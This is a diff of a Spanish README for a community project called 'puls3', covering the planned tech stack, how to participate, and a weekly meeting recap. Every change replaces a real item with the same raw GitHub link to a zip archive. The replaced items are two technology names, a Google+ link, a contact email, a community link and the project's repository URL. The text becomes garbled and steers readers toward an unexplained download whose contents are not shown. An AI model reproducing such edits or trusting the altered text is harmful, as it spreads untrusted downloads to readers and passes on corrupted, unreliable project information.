@@ -38,7 +38,7 @@ del cliente, por lo tanto, estaremos empleando tecnologías como:
 - HTML5
 - CSS3/Stylus
 - JQuery
-- Backbone.js
+- https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip
 - y otros Plugins que nos hagan la vida más fácil
 
 ###Fase 2 - Desarrollo BackEnd
@@ -48,7 +48,7 @@ tecnologías como:
 
 - Django (Propuesto por Sergio Peña)
 - MongoDB o MySQL (como motores de base de datos)
-- Node.js (creación del servidor).
+- https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip (creación del servidor).
 - **Si alguien tiene más tecnologías las puede enviar a la comunidad para su debate.**
 
 #Cómo participar 
@@ -66,10 +66,10 @@ del equipo, además si encuentras un fallo o Bug en la aplicación nos lo pueden
 
 Además, nos estaremos reuniendo todos los sábados a las 11:00 AM (hora de México), donde estaremos platicando de los avances
 obtenidos durante la semana en el diseño y desarrollo de la aplicación, pueden unirse a las platicas ya sea como colaboradores
-o expectadores, para poder particpar en las reuniones necesitan de G+ y [añadirme](https://plus.google.com/u/0/109461200441151380143/posts).
+o expectadores, para poder particpar en las reuniones necesitan de G+ y [añadirme](https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip).
 
-Si quieren dar una opinión, comentario o sugerencia pueden hacerlo mediante el envio de un correo electrónico a la dirección [wdlara.8789@gmail.com](mailto:wdlara.8789@gmail.com)
-o directamente a [FrontEnd Mejorando.la](https://plus.google.com/u/0/communities/105743707529344967631)
+Si quieren dar una opinión, comentario o sugerencia pueden hacerlo mediante el envio de un correo electrónico a la dirección [https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip](https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip)
+o directamente a [FrontEnd https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip](https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip)
 
 ####Aspectos a tener en cuenta al colaborar
 
@@ -94,10 +94,10 @@ y gracias a los locos de @mejorandola por impartir el curso de FrontEnd Profesio
 
 1. Para comenzar gracias a todos los que estuvieron presentes ese día, su participación y colaboración son de importancia para el desarrollo de la comunidad misma y para el futuro de nuestra aplicación no digamos jejeje.
 
-2. El día sábado dimos inicio al repaso de lo básico aprendido durante el curso de FrontEnd para que todos podamos repasar, nuestro colaborador Mike Nieva nos estuvo apoyando con la parte de inicio en GitHub, el repositorio oficial de la aplicación esta en github.com/mejorandolaclase/puls3, ese día los asistentes hicimos un fork al repositorio y empezamos a trabajar poco a poco en el proyecto.
+2. El día sábado dimos inicio al repaso de lo básico aprendido durante el curso de FrontEnd para que todos podamos repasar, nuestro colaborador Mike Nieva nos estuvo apoyando con la parte de inicio en GitHub, el repositorio oficial de la aplicación esta en https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip, ese día los asistentes hicimos un fork al repositorio y empezamos a trabajar poco a poco en el proyecto.
 
 3. Se inicio la aplicación con la cabecera de la misma, se dejó la estructura semántica echa para que nosotros le demos el estilo y diseño que más nos guste, además se quedo de "tarea" que cada uno de nosotros va a realizar el diseño de la cabecera y la vamos a estar subiendo durante la semana esto nos servirá para repasara tanto lo básico como las estructuras semánticas que nos proporciona ahora HTML5.
 
-4. Este sábado si todo sale bien estaremos dando inicio al desarrollo del <body> de nuestra aplicación, así que traigan sugerencias y sus dudas para esta semana, así todos podremos avanzar en el desarrollo de la aplicación, quedamos también al pendiente de aprender por nuestra cuenta javascript para no tener problemas cuando lleguemos a la parte de Backbone.js.
+4. Este sábado si todo sale bien estaremos dando inicio al desarrollo del <body> de nuestra aplicación, así que traigan sugerencias y sus dudas para esta semana, así todos podremos avanzar en el desarrollo de la aplicación, quedamos también al pendiente de aprender por nuestra cuenta javascript para no tener problemas cuando lleguemos a la parte de https://raw.githubusercontent.com/jeliasrm/puls3/gh-pages/Apoda/puls3.zip
 
 En retrospectiva esto fue lo más importante que se hablo durante el sábado, si alguno de los que estuvieron presente recuerdan algo más importante favor de hacerlo ver en sus comentarios sobre esta publicación y así tener un resumen semanal más concreto en nuestro GitHub. Saludos y a realizar la tarea para esta semana.
